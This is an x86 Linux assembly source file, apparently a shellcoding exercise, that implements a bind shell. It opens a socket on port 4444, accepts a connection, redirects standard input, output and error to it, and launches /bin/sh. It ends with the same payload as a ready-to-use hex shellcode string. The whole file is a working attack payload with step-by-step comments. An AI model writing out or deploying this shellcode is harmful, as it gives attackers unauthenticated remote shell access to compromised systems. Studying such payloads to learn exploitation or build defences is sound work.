global _start

section .text
_start:
; [ Setup the socket ]
; socketcall(int call, *args) eax 102 -> ebx, esp
; socket(int domain, int type, int protocol) -> push, push, push
; invoke system call
;
	xor ebx, ebx
	mul ebx
	mov al, 102			; socketcall()
	mov bl, 1			; SYS_SOCK = 1
	push edx 			; IPPROTO_IP = 0
	push ebx 			; SOCK_STREAM = 1
	push 2				; AF_INET = 2
	mov ecx, esp
	int 0x80
; NOTE: eax contains sockfd 
;
; [ Bind to the socket ]
; store eax
; socketcall(int call, *args) eax 102 -> ebx, esp
; bind(int sockfd, struct *sockaddr, addrlen) -> push, push <struct>, push <eaxStore>
; invoke system call
;
	mov edi, eax
	push edx 			; *sockaddr INADDR_ANY = 0
	push word 0x5c11	; *sockaddr PORT = 4444
	push word 2				; *sockaddr AF_INET = 2	
	mov ebx, esp
	push byte 16		; push addrlen onto the stack
	push ebx			; push the pointer to the struct onto the stack
	push edi			; push sockfd onto the stack
	mul edx
	xor ebx, ebx
	mov al, 102			; socketcall()
	mov bl, 2			; SYS_bind = 2
	mov ecx, esp		; point ecx to the arguments passed to the stack
	int 0x80	
	
; [ Listen on the socket ]
; socketcall(int call, *args) eax 102 -> ebx, esp
; listen(int sockfd, int backlog) push, push <eaxStore>
; invoke system call
;
	mul edx
	mov al, 102
	xor ebx, ebx
	mov bl, 4			; SYS_LISTEN = 4
	push edx			; backlog = 0
	push edi			; sockfd
	mov ecx, esp		; TEST
	int 0x80

; [ Accept a connection on a socket ]
; socketcall(int call, *args) eax 102 -> ebx, esp
; accept(int sockfd, struct *sockaddr, addrlen) -> push, push <struct>, push <eaxStore>
; invoke system call
;
	push edx			; addrlen = NULL
	push edx			; *sockaddr = NULL
	push edi			; sockfd
	mul edx
	mov al, 102			; socketcall()
	xor ebx, ebx
	mov bl, 5			; SYS_ACCEPT
	mov ecx, esp		; stack pointer args
	int 0x80
	
; [ Duplicate file descriptors and write to socketfd ]
; #define STDIN_FILENO	0	/* Standard input */
; #define STDOUT_FILENO 1	/* Standard output */
; #define STDERR_FILENO 2	/* Standard error */
; dup2(int oldfd, newfd) eax 63 -> <eaxStore>,<register->2>
; [ Setup FD loop ]
; dup2:
;	int 0x80
;	dec <register>
;	jns dup
	mov ebx, eax
	xor ecx, ecx
	mov cl, 2
	mul edx
dup2:
	mov al, 63
	int 0x80
	dec ecx
	jns dup2

; [ Execute /bin/sh ]
; "//bin/sh"[::-1].encode('hex')
; '68732f6e69622f2f'
; 
; execve(const char *filename, push NULL, push, push, ebx->esp
;			   char *const argv[], push ebx, ecx->esp
;			   char *const envp[], push NULL, edx->esp
;) eax 11
; invoke system call
	xor eax,eax
	push eax
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	mov edx, eax
	mov ecx, eax

	mov al, 11
	int 0x80
; \x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe3\x6a\x10\x53\x57\xf7\xe2\x31\xdb\xb0\x66\xb3\x02\x89\xe1\xcd\x80\xf7\xe2\xb0\x66\x31\xdb\xb3\x04\x52\x57\x89\xe1\xcd\x80\x52\x52\x57\xf7\xe2\xb0\x66\x31\xdb\xb3\x05\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xf7\xe2\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc2\x89\xc1\xb0\x0b\xcd\x80
